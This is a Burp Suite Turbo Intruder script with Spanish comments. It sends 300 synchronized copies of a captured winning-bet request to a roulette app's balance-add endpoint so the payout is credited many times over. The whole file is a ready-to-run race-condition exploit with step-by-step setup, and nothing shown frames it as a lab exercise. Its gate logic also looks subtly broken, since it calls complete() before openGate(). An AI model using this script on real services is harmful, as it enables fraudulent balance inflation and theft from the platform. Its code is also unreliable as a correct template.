# Turbo Intruder script for exploiting race condition in POST /api/balance/add
#
# SETUP:
# 1. En la ruleta, haz una apuesta y GANA
# 2. Captura la request POST /api/balance/add en Burp Proxy
# 3. Click derecho → Extensions → Turbo Intruder → Send to turbo intruder
# 4. Reemplaza el script con este archivo
# 5. Click "Attack"
#
# IMPORTANTE: Este script usa la técnica "gate" para sincronizar todas las requests
# y lanzarlas EXACTAMENTE al mismo tiempo para maximizar la race condition

def queueRequests(target, wordlists):
    # Número de requests a enviar (DEBE SER <= concurrentConnections para evitar deadlock)
    NUM_REQUESTS = 300

    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=NUM_REQUESTS,  # Igual al número de requests
                          requestsPerConnection=1,              # 1 request por conexión
                          pipeline=False,                       # No pipeline
                          maxRetriesPerRequest=0,
                          timeout=10
                          )

    # GATE TECHNIQUE: Todas las requests se encolan primero, luego se lanzan simultáneamente
    # Esto maximiza la probabilidad de explotar la race condition

    # Encolar todas las requests (no se envían aún, esperan el gate)
    for i in range(NUM_REQUESTS):
        engine.queue(target.req, gate='race1')

    # IMPORTANTE: Pequeño delay para asegurar que todas las requests estén encoladas
    # antes de abrir el gate
    engine.complete(timeout=60)

    # Abrir el gate - TODAS las requests se lanzan SIMULTÁNEAMENTE
    engine.openGate('race1')


def handleResponse(req, interesting):
    # Callback cuando llega una respuesta
    # Muestra solo las exitosas (200 OK)
    if req.status == 200:
        table.add(req)
